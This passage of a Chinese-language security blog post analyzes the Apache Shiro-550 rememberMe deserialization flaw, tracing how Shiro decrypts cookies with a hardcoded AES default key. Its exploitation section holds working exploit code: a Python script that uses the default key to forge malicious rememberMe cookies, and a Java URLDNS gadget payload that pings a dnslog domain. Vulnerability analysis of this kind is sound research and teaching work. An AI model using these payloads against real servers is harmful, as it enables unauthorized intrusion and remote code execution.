包里的类。</li></ul><p>定位到<code>CookieRememberMeManager</code>这个处理类，看一下各个方法实现的目的，最终找到了<code>getRememberedSerializedIdentity</code>这个方法，所实现目的如下</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] <span class="hljs-title function_">getRememberedSerializedIdentity</span>(SubjectContext subjectContext) &#123;<br>        <span class="hljs-keyword">if</span> (!WebUtils.<span class="hljs-property">isHttp</span>(subjectContext)) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">log</span>.<span class="hljs-property">isDebugEnabled</span>()) &#123;<br>                <span class="hljs-built_in">String</span> msg = <span class="hljs-string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to retrieve the rememberMe cookie. Returning immediately and ignoring rememberMe operation.&quot;</span>;<br>                <span class="hljs-built_in">log</span>.<span class="hljs-property">debug</span>(msg);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            WebSubjectContext wsc = (WebSubjectContext)subjectContext;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">this</span>.<span class="hljs-property">isIdentityRemoved</span>(wsc)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                HttpServletRequest request = WebUtils.<span class="hljs-property">getHttpRequest</span>(wsc);<br>                HttpServletResponse response = WebUtils.<span class="hljs-property">getHttpResponse</span>(wsc);<br>                <span class="hljs-built_in">String</span> base64 = <span class="hljs-variable">this</span>.<span class="hljs-property">getCookie</span>().<span class="hljs-property">readValue</span>(request, response);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;deleteMe&quot;</span>.<span class="hljs-property">equals</span>(base64)) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (base64 != <span class="hljs-literal">null</span>) &#123;<br>                    base64 = <span class="hljs-variable">this</span>.<span class="hljs-property">ensurePadding</span>(base64);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">log</span>.<span class="hljs-property">isTraceEnabled</span>()) &#123;<br>                        <span class="hljs-built_in">log</span>.<span class="hljs-property">trace</span>(<span class="hljs-string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="hljs-string">&quot;]&quot;</span>);<br>                    &#125;<br><br>                    <span class="hljs-type">byte</span>[] decoded = Base64.<span class="hljs-property">decode</span>(base64);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">log</span>.<span class="hljs-property">isTraceEnabled</span>()) &#123;<br>                        <span class="hljs-built_in">log</span>.<span class="hljs-property">trace</span>(<span class="hljs-string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="hljs-literal">null</span> ? decoded.<span class="hljs-property">length</span> : <span class="hljs-number">0</span>) + <span class="hljs-string">&quot; bytes.&quot;</span>);<br>                    &#125;<br><br>                    <span class="hljs-keyword">return</span> decoded;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">这段代码的功能是从Web请求中获取记住我的身份信息：<br>首先检查SubjectContext是否为HTTP类型，如果不是则直接返回<span class="hljs-literal">null</span><br>检查身份是否已被移除，如果是则返回<span class="hljs-literal">null</span><br>从Cookie中读取Base64编码的身份信息<br>如果读取到<span class="hljs-string">&quot;deleteMe&quot;</span>标识则返回<span class="hljs-literal">null</span><br>对读取的Base64字符串进行填充处理并解码<br>返回解码后的字节数组身份信息<br></code></pre></td></tr></table></figure><p>先判断是否为 HTTP 请求，如果是的话，获取 cookie 中 rememberMe 的值，然后判断是否是 deleteMe，不是则判断是否是符合 base64 的编码长度，然后再对其进行 base64 解码，将解码结果返回。</p><p>逆向跟进一下，看一下哪里调用了这个方法，定位到 <code>AbstractRememberMeManager</code> 这个接口的 <code>getRememberedPrincipals()</code> 方法，</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2006.31.42@2x.png"></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl">获取序列化的身份数据<br>调用 <span class="hljs-function"><span class="hljs-title">getRememberedSerializedIdentity</span>(<span class="hljs-variable">subjectContext</span>) 方法，该方法会从<span class="hljs-variable">HTTP</span>请求的<span class="hljs-variable">Cookie</span>中读取之前存储的<span class="hljs-variable">Base64</span>编码的身份信息，如果没有找到相关<span class="hljs-variable">Cookie</span>或<span class="hljs-variable">Cookie</span>已被标记为删除，则返回<span class="hljs-variable"><span class="hljs-literal">null</span></span></span><br><span class="hljs-function">检查获取结果</span><br><span class="hljs-function">判断 <span class="hljs-variable">bytes</span> 是否为<span class="hljs-variable"><span class="hljs-literal">null</span></span>，如果为<span class="hljs-variable"><span class="hljs-literal">null</span></span>，说明没有有效的记住我信息，直接返回<span class="hljs-variable"><span class="hljs-literal">null</span></span></span><br><span class="hljs-function">转换字节数据为身份集合</span><br><span class="hljs-function">调用 <span class="hljs-title">convertBytesToPrincipals</span>(<span class="hljs-variable">bytes</span>) 方法</span><br></code></pre></td></tr></table></figure><p>跟进这个<code>convertBytesToPrincipals</code>方法</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">protected</span> PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.getCipherService() != <span class="hljs-literal">null</span>) &#123;<br>        bytes = <span class="hljs-keyword">this</span>.decrypt(bytes);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.deserialize(bytes);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法将之前的 bytes 数组转换成了认证信息，在 <code>convertBytesToPrincipals()</code> 这个方法当中，很明确地做了两件事，一件是 <strong>decrypt</strong> 的解密，另一件是 <strong>deserialize</strong> 的反序列化。</p><h2 id="解密过程之-decrypt-方法"><a href="#解密过程之-decrypt-方法" class="headerlink" title="解密过程之 decrypt() 方法"></a>解密过程之 <code>decrypt()</code> 方法</h2><p>跟进解密的decrypt方法</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">protected byte[] decrypt(byte[] <span class="hljs-keyword">encrypted</span>) &#123;<br>    byte[] serialized = <span class="hljs-keyword">encrypted</span>;<br>    CipherService cipherService = this.getCipherService();// 获取一个加密服务也就是实现 AOP 的实现类<br>    <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-keyword">null</span>) &#123;<br>        ByteSource byteSource = cipherService.decrypt(<span class="hljs-keyword">encrypted</span>, this.getDecryptionCipherKey());// 关键代码，如果加密服务存在，则调用 cipherService 的 decrypt 方法进行解密，参数包括：<span class="hljs-keyword">encrypted</span>: 待解密的数据getDecryptKey(): 通过 getDecryptKey() 方法获取的解密密钥key，重点关注一下key<br>        serialized = byteSource.getBytes();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> serialized;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进<code>getDecryptionCipherKey</code>这个方法看一下，一个 btye[] 的方法，返回了 <code>decryptionCipherKey</code>。</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.05.47@2x.png"></p><p>跟进 <code>decryptionCipherKey</code> 之后，查看谁调用了它，发现是 <code>setDecryptionCipherKey()</code> 方法，继续跟进这个方法，查看一下哪里调用了 <code>setDecryptionCipherKey()</code> 方法</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.29.33@2x.png"></p><p>设置加密和解密使用的密钥。该方法接收一个字节数组类型的密钥参数，然后分别调用<code>setEncryptionCipherKey()</code>和<code>setDecryptionCipherKey()</code>方法，将同一个密钥同时设置为加密密钥和解密密钥。那么看一下是在哪里调用了setCipherKey并传入的参数</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.33.01@2x.png"></p><p>非常显而易见的，传入的参数为 <code>DEFAULT_CIPHER_KEY_BYTES</code>，并且是一个固定的值，流程为</p><p><img src="https://img1.plumstar.cn/upload5image-20250805073929599.png"></p><h2 id="解密过程之-deserialize-反序列化"><a href="#解密过程之-deserialize-反序列化" class="headerlink" title="解密过程之 deserialize 反序列化"></a>解密过程之 <code>deserialize</code> 反序列化</h2><p>回到之前跟进到<code>convertBytesToPrincipals</code>方法时，跟进deserialize方法</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.42.54@2x.png"></p><p>跟进一下，有两个实现方法</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.48.51@2x.png"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.53.46@2x.png"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c">这段代码实现了一个反序列化方法，功能如下：<br>参数校验：检查输入的字节数组是否为<span class="hljs-literal">null</span>，如果是则抛出IllegalArgumentException异常<br>流包装：将字节数组包装成ByteArrayInputStream，再用BufferedInputStream进行缓冲包装<br>反序列化：使用自定义的ClassResolvingObjectInputStream读取对象，将其转换为泛型T类型<br>异常处理：如果反序列化过程中出现任何异常，统一抛出SerializationException<br>资源清理：正常情况下关闭ObjectInputStream流并返回反序列化结果<br></code></pre></td></tr></table></figure><p><code>deserialize()</code> 方法调用了原生的 <code>readObject()</code>，所以这里反序列化的地方是一个很好的入口类，可以作为我们反序列化的入口</p><p>至此，Shiro 拿到 HTTP 包里的 Cookie 的解密过程已经梳理地很清楚了，我们再回头看一看那一段 Cookie 是如何产生的，也就是加密过程。</p><h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><ul><li>定位到<code>AbstractRememberMeManager</code> 接口的 <code>onSuccessfulLogin</code> 方法处，并在这里打个断点，这是判断是Shiro框架中处理用户登录成功后的行为的方法</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 处理用户登录成功后的回调方法</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> subject 当前认证主体对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> token 认证令牌</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> info 认证信息</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) &#123;<br>    <span class="hljs-comment">// 登录成功后，首先清除当前身份信息</span><br>    <span class="hljs-keyword">this</span>.forgetIdentity(subject);<br>    <br>    <span class="hljs-comment">// 根据令牌判断是否需要记住用户身份</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.isRememberMe(token)) &#123;<br>        <span class="hljs-comment">// 如果需要记住身份，则保存用户身份信息，调用rememberIdentity方法</span><br>        <span class="hljs-keyword">this</span>.rememberIdentity(subject, token, info);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>        <span class="hljs-comment">// 如果不需要记住身份且调试日志开启，则记录相关信息</span><br>        log.debug(<span class="hljs-string">&quot;AuthenticationToken did not indicate RememberMe is requested.  RememberMe functionality will not be executed for corresponding account.&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.09.25@2x.png"></p><p>这个判断这里，简单判断 RememberMe 字段是否为 true，再调用了 <code>rememberIdentity()</code> 方法，F7 进入 <code>rememberIdentity()</code> 方法，这里一串调用，保存用户名。</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.16.28@2x.png"></p><p>回到 <code>rememberIdentity()</code> 方法，跟进<code>this.rememberIdentity(subject, principals)</code></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.23.47@2x.png"></p><p>进入 <code>convertPrincipalsToBytes()</code> 方法，里面和我们之前看的解密里面的 <code>convertBytesToPrincipals()</code> 非常相似，不过将解密变成了加密，将反序列化改成了序列化。</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.23.01@2x.png"></p><p>继续跟进到serialize方法，看一眼实现的代码，和之前一样反序列化找的过程一致，序列化最后如图</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.30.10@2x.png"></p><p>再回到<code>convertPrincipalsToBytes</code>方法中看一下 encrypt 加密的那一段</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.31.31@2x.png"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.32.30@2x.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">这段代码实现了一个加密方法，功能如下：<br>接收序列化后的字节数组作为输入<br>获取加密服务实例<br>如果加密服务存在，则使用该服务和加密密钥对数据进行加密<br>返回加密后的字节数组<br>核心逻辑是：有加密服务就加密，没有就直接返回原数据<br></code></pre></td></tr></table></figure><p>可以看到这里传入的两个参数，调用encrypt进行加密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ByteSource</span> <span class="hljs-variable">byteSource</span> <span class="hljs-operator">=</span> cipherService.encrypt(serialized, <span class="hljs-built_in">this</span>.getEncryptionCipherKey());<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-06%20at%2005.38.36@2x.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">这段代码实现了一个加密方法，也就是AES对称加密，主要功能如下：<br>初始化向量处理：根据配置决定是否生成初始化向量(IV)<br>IV生成验证：如果启用IV生成，则调用generateInitializationVector方法生成IV，并验证生成的IV不为空<br>执行加密：调用重载的<span class="hljs-built_in">encrypt</span>方法执行实际的加密操作，传入明文、密钥、IV和生成标志<br></code></pre></td></tr></table></figure><p>一个参数是需要加密的字段，一个即为key，那么我们回到上面跟进<code>getEncryptionCipherKey</code>这个方法看一下key的获取方式，其实这里就跟上面解密的步骤一样了，代码也是完全一样的，只不过顺序颠倒了一下</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-06%20at%2005.53.26@2x.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getDecryptionCipherKey</span><span class="hljs-params">()</span></span> - 获取解密密钥<br><span class="hljs-function"><span class="hljs-title">setDecryptionCipherKey</span><span class="hljs-params">()</span></span> - 设置解密密钥<br><span class="hljs-function"><span class="hljs-title">getCipherKey</span><span class="hljs-params">()</span></span> - 获取加密密钥（通过调用getEncryptionCipherKey）<br><span class="hljs-function"><span class="hljs-title">setCipherKey</span><span class="hljs-params">()</span></span> - 设置加密密钥<br></code></pre></td></tr></table></figure><p>依旧去找哪里调用了setCipherKey方法，很显然跟解密的过程是一样的</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-06%20at%2006.10.45@2x.png"></p><p>最重点的就是使用默认key，给了我们根据默认key进行反序列化打进去的机会</p><p>跳出这个地方回到 <code>rememberIdentity()</code> 方法，看一下从<code>convertPrincipalsToBytes</code>之后后续的处理</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2023.23.47@2x.png"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-06%20at%2006.26.40@2x.png"></p><p>通过 AES 加密之后的 Cookie，拿去 Base64 编码，那么也就是我们前面数据包里看到的cookie了</p><h1 id="0x04-Shiro-550-漏洞利用"><a href="#0x04-Shiro-550-漏洞利用" class="headerlink" title="0x04 Shiro-550 漏洞利用"></a>0x04 Shiro-550 漏洞利用</h1><p>看一下依赖，很明显该从哪里入手了，CC链和CB链都可以合理尝试一下（这里shiro是用不到CommonsCollections依赖的，是我们后续手动加的，原生依赖只有CommonsBeanutils）</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2007.04.29@2x.png" alt="CleanShot 2025-08-08 at 07.04.29@2x"></p><h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>很简单的，就是将反序列化的东西，进行 shiro 的一系列加密操作，再把最后的那串东西替换包中的 RememberMe 字段的值。加密脚本如下，逻辑就是跟上面分析的过程一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># －*-* coding:utf-8</span><br><span class="hljs-comment"># @Time    :  2022/7/13 17:36</span><br><span class="hljs-comment"># @Author  : Drunkbaby</span><br><span class="hljs-comment"># @FileName: encrypt.py</span><br><span class="hljs-comment"># @Software: VSCode</span><br><span class="hljs-comment"># @Blog    ：https://drun1baby.github.io/</span><br><br><span class="hljs-keyword">from</span> email.mime <span class="hljs-keyword">import</span> base<br><span class="hljs-keyword">from</span> pydoc <span class="hljs-keyword">import</span> plain<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br>    enc_data = base64.b64decode(enc_data)<br>    unpad = <span class="hljs-keyword">lambda</span> s: s[:-s[-<span class="hljs-number">1</span>]]<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = enc_data[:<span class="hljs-number">16</span>]<br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br>    plaintext = unpad(plaintext)<br>    <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure><blockquote><ol><li><p>get_file_data(filename)：从文件中读取二进制数据</p></li><li><p>aes_enc(data)：使用AES-CBC模式加密数据</p></li></ol><ul><li><p>使用Shiro默认的硬编码密钥”kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;”</p></li><li><p>生成随机IV并加到加密数据前面</p></li><li><p>对输入数据进行PKCS#7填充</p></li><li><p>返回base64编码的加密结果</p></li></ul><ol start="3"><li>aes_dec(enc_data)：解密AES加密的数据</li></ol><ul><li><p>从加密数据中提取IV(前16字节)</p></li><li><p>使用相同的密钥解密</p></li><li><p>移除填充并返回原始数据</p></li></ul><ol start="4"><li>主函数从”ser.bin”文件读取序列化的Java对象数据，加密后打印结果</li></ol></blockquote><p>该脚本可以将恶意的序列化Java对象加密成符合Shiro格式的rememberMe cookie值，用于漏洞利用。</p><h2 id="URLDNS-链"><a href="#URLDNS-链" class="headerlink" title="URLDNS 链"></a>URLDNS 链</h2><p>构造 Payload 需要将利用链通过 AES 加密后在 Base64 编码。将 Payload 的值设置为 rememberMe 的 cookie 值，这里借助 ysoserial 中的 URLDNS 链去打，由于 URLDNS 不依赖于 Commons Collections 包，所以也是最简单的利用方式，只需要 JDK 的包就行，所以一般用于检测是否存在漏洞。</p><p>exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.net.URL;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNSEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();  <br>        <span class="hljs-comment">// 这里不要发起请求  </span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://ano5x1.dnslog.cn&quot;</span>);  <span class="hljs-comment">//改为你自己的DNS监控域名</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <br>        hashcodefile.setAccessible(<span class="hljs-literal">true</span>);  <br>        hashcodefile.set(url,<span class="hljs-number">1234</span>);  <br>        hashmap.put(url,<span class="hljs-number">1</span>);  <br>        <span class="hljs-comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性  </span><br>        hashcodefile.set(url,-<span class="hljs-number">1</span>);  <br>        serialize(hashmap);  <br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <span class="hljs-comment">//生成反序列化后的文件</span><br>        &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br>        oos.writeObject(obj);  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br>        <span class="hljs-keyword">return</span> obj;  <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><ol><li><p><strong>对象构造陷阱</strong></p><ul><li>创建 <code>URL</code>对象指向监控域名（如 <code>oastify.com</code>）</li><li>通过反射强制修改其 <code>hashCode</code>为 <code>1234</code>（<strong>避免创建时立即触发DNS解析</strong>）</li></ul></li><li><p><strong>序列化准备</strong></p><ul><li>将修改后的 <code>URL</code>存入 <code>HashMap</code></li><li>再次通过反射将 <code>URL.hashCode</code>重置为 <code>-1</code>（关键操作❗️）</li><li>序列化 <code>HashMap</code>到文件 <code>ser.bin</code></li></ul></li><li><p><strong>漏洞触发机制</strong></p><ul><li><p><strong>当 <code>ser.bin</code>被反序列化时</strong>：</p><p>→ <code>HashMap</code>重建数据结构计算键的哈希值</p><p>→ <code>URL.hashCode=-1</code>触发重新计算</p><p>→ 调用 <code>URLStreamHandler.getHostAddress()</code></p><p>→ <strong>向预设域名发起DNS查询</strong></p></li></ul></li></ol></blockquote><p>执行exp生成ser.bin文件</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span 